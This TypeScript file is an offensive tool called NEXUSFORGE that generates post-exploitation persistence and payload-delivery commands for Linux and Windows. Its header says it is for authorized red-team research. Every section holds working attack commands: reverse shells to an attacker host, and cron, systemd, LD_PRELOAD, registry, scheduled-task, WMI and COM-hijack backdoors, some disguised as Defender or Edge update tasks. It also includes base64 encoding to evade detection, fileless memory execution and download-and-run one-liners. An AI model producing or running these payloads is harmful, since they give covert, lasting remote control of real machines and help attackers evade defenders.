/* ═══════════════════════════════════════════════════════════════════════════
   NEXUSFORGE — Persistence Engine
   Generates post-exploitation persistence payloads for authorized red-team
   research. Linux + Windows mechanisms with stealth ratings.
   ═══════════════════════════════════════════════════════════════════════════ */

export interface PersistencePayload {
  technique: string;
  category:  "linux" | "windows";
  stealth:   1 | 2 | 3 | 4 | 5;   /* 5 = most stealthy */
  command:   string;
  notes:     string;
}

export interface DeliveryPayload {
  name:    string;
  os:      "linux" | "windows" | "any";
  command: string;
  notes:   string;
}

/* ── Linux Persistence ─────────────────────────────────────────────────────── */
export function buildLinuxPersistence(lhost: string, lport: string, cmd: string): PersistencePayload[] {
  const safe   = cmd.replace(/'/g, "\\'");
  const revCmd = `bash -i >& /dev/tcp/${lhost}/${lport} 0>&1`;
  const b64rev = Buffer.from(revCmd).toString("base64");

  return [
    {
      technique: "Cron — per-minute user job",
      category: "linux", stealth: 2,
      command: `(crontab -l 2>/dev/null; echo "* * * * * ${safe} >/dev/null 2>&1") | crontab -`,
      notes: "Adds a per-minute cron entry for the current user. Easy to detect with 'crontab -l'.",
    },
    {
      technique: "Cron — system-wide (root)",
      category: "linux", stealth: 2,
      command: `echo "* * * * * root ${safe} >/dev/null 2>&1" >> /etc/cron.d/sysupd`,
      notes: "Requires root. Creates /etc/cron.d/sysupd. Survives reboots.",
    },
    {
      technique: "Cron — @reboot trigger",
      category: "linux", stealth: 3,
      command: `(crontab -l 2>/dev/null; echo "@reboot ${safe} >/dev/null 2>&1") | crontab -`,
      notes: "Fires exactly once on every system reboot.",
    },
    {
      technique: "Bashrc injection",
      category: "linux", stealth: 2,
      command: `echo "${safe} >/dev/null 2>&1 &" >> ~/.bashrc`,
      notes: "Triggers on every new interactive bash session for current user.",
    },
    {
      technique: "Profile injection (~/.profile)",
      category: "linux", stealth: 2,
      command: `echo "${safe} >/dev/null 2>&1 &" >> ~/.profile`,
      notes: "Triggers on login shells. Works for sh/dash as well as bash.",
    },
    {
      technique: "Global profile.d (root)",
      category: "linux", stealth: 3,
      command: `printf '#!/bin/sh\\n${safe} >/dev/null 2>&1 &\\n' > /etc/profile.d/syschk.sh && chmod +x /etc/profile.d/syschk.sh`,
      notes: "Requires root. Fires for ALL users on login.",
    },
    {
      technique: "Authorized_keys injection",
      category: "linux", stealth: 4,
      command: `mkdir -p ~/.ssh && chmod 700 ~/.ssh && echo 'ssh-rsa AAAA...ATTACKER_PUB_KEY attacker@nexus' >> ~/.ssh/authorized_keys && chmod 600 ~/.ssh/authorized_keys`,
      notes: "Replace AAAA... with attacker RSA public key. Enables passwordless SSH forever.",
    },
    {
      technique: "SSH forced-command backdoor",
      category: "linux", stealth: 5,
      command: `echo 'command="${safe}",no-port-forwarding,no-X11-forwarding,no-agent-forwarding ssh-rsa AAAA...PUB_KEY' >> ~/.ssh/authorized_keys`,
      notes: "Executes command on every SSH connection instead of shell. Hard to spot.",
    },
    {
      technique: "Systemd user service",
      category: "linux", stealth: 3,
      command: `mkdir -p ~/.config/systemd/user && cat > ~/.config/systemd/user/sysupd.service << 'EOF'\n[Unit]\nDescription=System Update Service\n[Service]\nType=simple\nRestart=always\nRestartSec=60\nExecStart=/bin/bash -c '${safe}'\n[Install]\nWantedBy=default.target\nEOF\nsystemctl --user enable --now sysupd`,
      notes: "No root required. Restarts automatically. Survives reboots.",
    },
    {
      technique: "Systemd system service (root)",
      category: "linux", stealth: 3,
      command: `cat > /etc/systemd/system/sysupd.service << 'EOF'\n[Unit]\nDescription=System Update Daemon\nAfter=network.target\n[Service]\nType=simple\nRestart=always\nRestartSec=30\nExecStart=/bin/bash -c '${safe}'\n[Install]\nWantedBy=multi-user.target\nEOF\nsystemctl daemon-reload && systemctl enable --now sysupd`,
      notes: "Requires root. System-level service, starts at boot before login.",
    },
    {
      technique: "rc.local boot hook",
      category: "linux", stealth: 2,
      command: `echo "${safe} &" >> /etc/rc.local && chmod +x /etc/rc.local`,
      notes: "Requires root. Classic boot persistence. Monitored by most defenders.",
    },
    {
      technique: "SUID bash copy",
      category: "linux", stealth: 1,
      command: `cp /bin/bash /tmp/.sysbin && chmod u+s /tmp/.sysbin`,
      notes: "Creates SUID bash. Very noisy. Execute with: /tmp/.sysbin -p",
    },
    {
      technique: "LD_PRELOAD shared library",
      category: "linux", stealth: 5,
      command: `cat > /tmp/.pl.c << 'EOF'\n#include <stdlib.h>\n__attribute__((constructor)) void _init() { system("${safe}"); }\nEOF\ngcc -shared -fPIC -nostartfiles -o /tmp/.pl.so /tmp/.pl.c 2>/dev/null && echo /tmp/.pl.so > /etc/ld.so.preload`,
      notes: "Requires gcc + root. Injected into every dynamically linked binary on the system.",
    },
    {
      technique: "Reverse shell cron (b64-encoded)",
      category: "linux", stealth: 3,
      command: `(crontab -l 2>/dev/null; echo "*/5 * * * * bash -c 'echo ${b64rev}|base64 -d|bash' >/dev/null 2>&1") | crontab -`,
      notes: "Reverse shell every 5 min, b64-encoded to evade naive log scanning.",
    },
    {
      technique: "Systemd timer beacon",
      category: "linux", stealth: 4,
      command: `mkdir -p ~/.config/systemd/user\ncat > ~/.config/systemd/user/beacon.service << 'EOF'\n[Service]\nType=oneshot\nExecStart=/bin/bash -c 'echo ${b64rev}|base64 -d|bash'\nEOF\ncat > ~/.config/systemd/user/beacon.timer << 'EOF'\n[Unit]\nDescription=System Beacon\n[Timer]\nOnBootSec=30\nOnUnitActiveSec=300\n[Install]\nWantedBy=timers.target\nEOF\nsystemctl --user enable --now beacon.timer`,
      notes: "Beacons every 5 min via systemd timer. No crontab entry = less visible.",
    },
    {
      technique: "memfd fileless execution",
      category: "linux", stealth: 5,
      command: `python3 -c "\nimport ctypes,urllib.request,os\nm=ctypes.CDLL(None).memfd_create(b'',0)\nos.write(m,urllib.request.urlopen('http://${lhost}:${lport}/elf').read())\nos.execv(f'/proc/{os.getpid()}/fd/{m}',['svc'])"`,
      notes: "Downloads ELF and executes entirely from memory. No disk writes. Requires Linux 3.17+.",
    },
    {
      technique: "Python in-memory reverse shell",
      category: "linux", stealth: 4,
      command: `python3 -c "import socket,subprocess,os;s=socket.socket();s.connect(('${lhost}',${lport}));[os.dup2(s.fileno(),f) for f in (0,1,2)];subprocess.call(['/bin/sh','-i'])"`,
      notes: "Pure Python, no disk writes. Works on Linux/macOS/BSD.",
    },
  ];
}

/* ── Windows Persistence ───────────────────────────────────────────────────── */
export function buildWindowsPersistence(lhost: string, lport: string, cmd: string): PersistencePayload[] {
  const psRevShell = `$c=New-Object Net.Sockets.TCPClient('${lhost}',${lport});$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($n=$s.Read($b,0,$b.Length))-ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$n);$sb=(iex $d 2>&1|Out-String);$by=[text.encoding]::ASCII.GetBytes($sb+'PS> ');$s.Write($by,0,$by.Length)}`;
  const b64ps = Buffer.from(psRevShell, "utf16le").toString("base64");
  const hiddenPs = `powershell -NonI -WindowStyle Hidden -Exec Bypass -EncodedCommand ${b64ps}`;

  return [
    {
      technique: "Registry Run Key (HKCU — no admin)",
      category: "windows", stealth: 2,
      command: `reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v SysUpdateSvc /t REG_SZ /d "${hiddenPs}" /f`,
      notes: "No admin required. Fires on current user logon. Commonly monitored.",
    },
    {
      technique: "Registry Run Key (HKLM — admin)",
      category: "windows", stealth: 2,
      command: `reg add "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v SysUpdateSvc /t REG_SZ /d "${hiddenPs}" /f`,
      notes: "Requires admin. Fires for ALL users on logon.",
    },
    {
      technique: "RunOnce key (single-fire)",
      category: "windows", stealth: 3,
      command: `reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce" /v Setup /t REG_SZ /d "${hiddenPs}" /f`,
      notes: "Fires once on next logon then removes itself. Useful for staged payloads.",
    },
    {
      technique: "Scheduled Task — on logon",
      category: "windows", stealth: 3,
      command: `schtasks /create /tn "WindowsDefenderCheck" /tr "${hiddenPs}" /sc onlogon /ru "%USERNAME%" /f`,
      notes: "Fires on every logon. Disguised as Defender task.",
    },
    {
      technique: "Scheduled Task — daily",
      category: "windows", stealth: 3,
      command: `schtasks /create /tn "MicrosoftEdgeUpdate" /tr "${hiddenPs}" /sc daily /st 08:00 /f`,
      notes: "Daily at 08:00. Disguised as Edge update. No admin needed.",
    },
    {
      technique: "Startup folder LNK (user)",
      category: "windows", stealth: 2,
      command: `echo ${hiddenPs} > "%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\svchost.bat"`,
      notes: "No admin required. Fires on logon. Startup folder is commonly scanned.",
    },
    {
      technique: "WMI event subscription (fileless)",
      category: "windows", stealth: 5,
      command: `powershell -c "$flt=Set-WMIInstance -Class '__EventFilter' -Namespace 'root/subscription' -Arguments @{Name='NXFilt';EventNameSpace='root/cimv2';QueryLanguage='WQL';Query=\"SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_LocalTime' AND TargetInstance.Seconds=0\"};$cns=Set-WMIInstance -Class 'CommandLineEventConsumer' -Namespace 'root/subscription' -Arguments @{Name='NXCons';CommandLineTemplate='${hiddenPs}'};Set-WMIInstance -Class '__FilterToConsumerBinding' -Namespace 'root/subscription' -Arguments @{Filter=\$flt;Consumer=\$cns}"`,
      notes: "Fileless. Fires every minute (at :00s). Persists across reboots. Admin required.",
    },
    {
      technique: "PowerShell profile injection",
      category: "windows", stealth: 3,
      command: `Add-Content $PROFILE "${hiddenPs}"`,
      notes: "Fires on every PowerShell session. Profile path: %USERPROFILE%\\Documents\\WindowsPowerShell\\profile.ps1",
    },
    {
      technique: "IFEO debugger hijack",
      category: "windows", stealth: 4,
      command: `reg add "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\calc.exe" /v Debugger /t REG_SZ /d "${hiddenPs}" /f`,
      notes: "Admin required. Triggers when calc.exe launches. Replace with any target binary.",
    },
    {
      technique: "COM object hijacking (HKCU)",
      category: "windows", stealth: 5,
      command: `reg add "HKCU\\Software\\Classes\\CLSID\\{B5F8350B-0548-48B1-A6EE-88BD00B4A5E7}\\InProcServer32" /ve /t REG_SZ /d "C:\\Users\\Public\\payload.dll" /f && reg add "HKCU\\Software\\Classes\\CLSID\\{B5F8350B-0548-48B1-A6EE-88BD00B4A5E7}\\InProcServer32" /v ThreadingModel /t REG_SZ /d Apartment /f`,
      notes: "No admin. CLSID is loaded by many Windows apps. Replace DLL path with your payload.",
    },
  ];
}

/* ── Payload Delivery ──────────────────────────────────────────────────────── */
export function buildDeliveryPayloads(lhost: string, lport: string, urlPath: string): DeliveryPayload[] {
  const url      = `http://${lhost}:${lport}/${urlPath}`;
  const httpsUrl = `https://${lhost}:${lport}/${urlPath}`;

  return [
    /* Linux */
    {
      name: "curl pipe bash",
      os: "linux",
      command: `curl -fsSL "${url}" | bash`,
      notes: "Streams script from URL and pipes directly into bash. Most common technique.",
    },
    {
      name: "wget pipe bash",
      os: "linux",
      command: `wget -qO- "${url}" | bash`,
      notes: "wget fallback for environments without curl.",
    },
    {
      name: "curl — save + execute",
      os: "linux",
      command: `curl -fsSL -o /tmp/.svc "${url}" && chmod +x /tmp/.svc && /tmp/.svc`,
      notes: "Downloads binary/script to disk, marks executable, runs it.",
    },
    {
      name: "Python urllib in-memory",
      os: "linux",
      command: `python3 -c "import urllib.request,os,tempfile as t;f=t.mktemp();urllib.request.urlretrieve('${url}',f);os.chmod(f,0o755);os.system(f)"`,
      notes: "No curl/wget needed. Drops to disk then executes.",
    },
    {
      name: "bash /dev/tcp (pure bash)",
      os: "linux",
      command: `exec 3<>/dev/tcp/${lhost}/${lport}; printf 'GET /${urlPath} HTTP/1.0\\r\\nHost: ${lhost}\\r\\n\\r\\n' >&3; tail -n +6 <&3 | bash`,
      notes: "Pure bash, zero external tools. /dev/tcp must be enabled (default on most distros).",
    },
    {
      name: "Perl LWP download",
      os: "linux",
      command: `perl -MLWP::Simple -e "getstore('${url}','/tmp/.svc');chmod(0755,'/tmp/.svc');system('/tmp/.svc')"`,
      notes: "Works when curl/wget unavailable. LWP::Simple ships with most Perl installs.",
    },
    {
      name: "Base64 inline dropper",
      os: "linux",
      command: `echo 'BASE64_PAYLOAD_HERE' | base64 -d > /tmp/.svc && chmod +x /tmp/.svc && /tmp/.svc`,
      notes: "Replace BASE64_PAYLOAD_HERE with base64-encoded ELF or shell script. No network needed.",
    },
    {
      name: "OpenSSL TLS fetch",
      os: "linux",
      command: `openssl s_client -quiet -connect ${lhost}:${lport} 2>/dev/null < <(printf 'GET /${urlPath} HTTP/1.0\\r\\nHost: ${lhost}\\r\\n\\r\\n') | tail -n +6 | bash`,
      notes: "Encrypted download via openssl when curl/wget are blocked but openssl is present.",
    },
    {
      name: "memfd fileless execution",
      os: "linux",
      command: `python3 -c "import ctypes,urllib.request,os;m=ctypes.CDLL(None).memfd_create(b'',0);os.write(m,urllib.request.urlopen('${url}').read());os.execv(f'/proc/{os.getpid()}/fd/{m}',['svc'])"`,
      notes: "Downloads ELF and runs entirely from RAM. No disk writes. Linux 3.17+ required.",
    },
    /* Windows */
    {
      name: "PowerShell IEX (WebClient)",
      os: "windows",
      command: `powershell -NonI -W Hidden -Exec Bypass -c "IEX((New-Object Net.WebClient).DownloadString('${httpsUrl}'))"`,
      notes: "Classic PowerShell IEX. Detected by most modern EDR; use encoded variant.",
    },
    {
      name: "PowerShell encoded IEX",
      os: "windows",
      command: `powershell -NonI -W Hidden -Exec Bypass -EncodedCommand ${Buffer.from(`IEX((New-Object Net.WebClient).DownloadString('${httpsUrl}'))`, "utf16le").toString("base64")}`,
      notes: "Base64-encoded command avoids simple string-matching signatures.",
    },
    {
      name: "CertUtil LOLBIN",
      os: "windows",
      command: `certutil -urlcache -split -f "${url}" %TEMP%\\svc.exe && %TEMP%\\svc.exe`,
      notes: "certutil is a signed Microsoft binary — often whitelisted. Creates disk artifact.",
    },
    {
      name: "BitsAdmin LOLBIN",
      os: "windows",
      command: `bitsadmin /transfer svc /download /priority normal "${url}" "%TEMP%\\svc.exe" && %TEMP%\\svc.exe`,
      notes: "Windows BITS service — runs in background, often allowed through firewalls.",
    },
    {
      name: "MSHTA scriptlet",
      os: "windows",
      command: `mshta.exe "${url}"`,
      notes: "Serves an HTA file; MSHTA executes VBScript/JScript. Bypasses many AppLocker policies.",
    },
    {
      name: "Regsvr32 Squiblydoo",
      os: "windows",
      command: `regsvr32 /s /n /u /i:"${url}" scrobj.dll`,
      notes: "Classic AppLocker bypass. URL must serve a COM scriptlet (.sct file).",
    },
    {
      name: "PowerShell save + run",
      os: "windows",
      command: `powershell -c "(New-Object Net.WebClient).DownloadFile('${url}','$env:TEMP\\svc.exe');Start-Process -WindowStyle Hidden \"$env:TEMP\\svc.exe\""`,
      notes: "Downloads and launches silently. AV may flag depending on payload.",
    },
  ];
}
